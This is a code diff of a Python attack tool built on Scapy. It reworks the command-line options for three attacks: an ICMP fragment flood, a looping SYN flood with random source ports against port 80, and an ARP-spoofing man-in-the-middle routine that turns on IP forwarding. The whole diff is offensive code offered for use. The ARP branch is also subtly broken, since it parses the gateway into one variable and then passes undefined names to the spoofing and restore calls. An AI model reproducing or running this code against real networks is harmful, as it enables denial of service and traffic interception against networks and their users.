@@ -14,10 +14,9 @@ parser = argparse.ArgumentParser()
 # Adding optional argument
 parser.add_argument("-i", "--ip", help = "Destination IP Address")
 parser.add_argument("-s", "--source", help = "Source IP Address")
-parser.add_argument("--host", help = "Host IP Address")
-parser.add_argument("--icmp", help = "ICMP Flood")
-parser.add_argument("--syn", help = "SYN Flood")
-parser.add_argument("--arp", help = "ARP Spoofing")
+parser.add_argument("--icmp", help = "ICMP Flood - size of the packet in bytes")
+parser.add_argument("--syn", help = "SYN Flood - size of the packet in bytes ")
+parser.add_argument("--arp", help = "ARP Spoofing - Host IP Address")
 parser.add_argument("-n", "--number", help = "Number of packets")
 parser.add_argument("-f", "--file", type=argparse.FileType('r'), help = "File with destination IP Addresses")
 
@@ -48,40 +47,43 @@ def thread_delay(thread_name, delay, ip):
 
 	else:
 		numPackets = N_PACKETS
+	
 
 	if args.icmp:
- 		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))
+ 		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp)))
 
-	if args.syn:
+
+	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
-		raw=Raw(b"x"*1024)
+		raw=Raw(args.syn)
 		p=ip_layer/tcp/raw
 		send(p, loop=1, verbose=0)
 
-	if args.arp:
-		if args.host: 
-			try:
-				gtw = ipaddress.ip_address(args.host)
-			except:
-				print('Address/netmask is invalid: %s' % args.host)
-				exit(1)
 
-			verbose = True
-			enable_ip_route()
-			try:
-				while True:
-					#telling the target that we are the host
-					spoof(ip, host, verbose)
-					#telling the host that we are the target
-					spoof(host, ip, verbose)
-					time.sleep(1)
-			except KeyboardInterrupt:
-				print("[!] Detected CTRL+C ! restoring the network, please wait...")
-				restore(target, host)
-				restore(host, target)
-		else:
-			print("Host IP address in mandatory!")
-			os._exit(1)
+	elif args.arp:
+		try:
+			gtw = ipaddress.ip_address(args.arp)
+		except:
+			print('Address/netmask is invalid: %s' % args.arp)
+			exit(1)
+
+		verbose = True
+		enable_ip_route()
+		try:
+			while True:
+				#telling the target that we are the host
+				spoof(ip, host, verbose)
+				#telling the host that we are the target
+				spoof(host, ip, verbose)
+				time.sleep(1)
+		except KeyboardInterrupt:
+			print("[!] Detected CTRL+C ! restoring the network, please wait...")
+			restore(target, host)
+			restore(host, target)
+		
+	else:
+		print("No option selected.")
+		os._exit(1)
 	
 
 
@@ -167,41 +169,40 @@ if args.ip:
 	
 
 	if args.icmp:
-		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))
+		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp)))
 
-	if args.syn:
+	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
-		raw=Raw(b"x"*1024)
+		raw=Raw(args.syn)
 		p=ip_layer/tcp/raw
 		print("Sending packets... Press CTRL+C to stop.")
 
 		send(p, loop=1, verbose=0)
 
-	if args.arp:
-		if args.host: 
-			try:
-				gtw = ipaddress.ip_address(args.host)
-			except:
-				print('Address/netmask is invalid: %s' % args.host)
-				exit(1)
-
-			verbose = True
-			enable_ip_route()
-			try:
-				while True:
-					#telling the target that we are the host
-					spoof(ip, host, verbose)
-					#telling the host that we are the target
-					spoof(host, ip, verbose)
-					time.sleep(1)
-			except KeyboardInterrupt:
-				print("[!] Detected CTRL+C ! restoring the network, please wait...")
-				restore(target, host)
-				restore(host, target)
-		else:
-			print("Host IP address in mandatory!")
+	elif args.arp:
+		try:
+			gtw = ipaddress.ip_address(args.arp)
+		except:
+			print('Address/netmask is invalid: %s' % args.arp)
 			exit(1)
-			
+
+		verbose = True
+		enable_ip_route()
+		try:
+			while True:
+				#telling the target that we are the host
+				spoof(ip, host, verbose)
+				#telling the host that we are the target
+				spoof(host, ip, verbose)
+				time.sleep(1)
+		except KeyboardInterrupt:
+			print("[!] Detected CTRL+C ! restoring the network, please wait...")
+			restore(target, host)
+			restore(host, target)
+		
+	else:
+		print("No option selected.")
+		exit(1)
 	
 
 else:
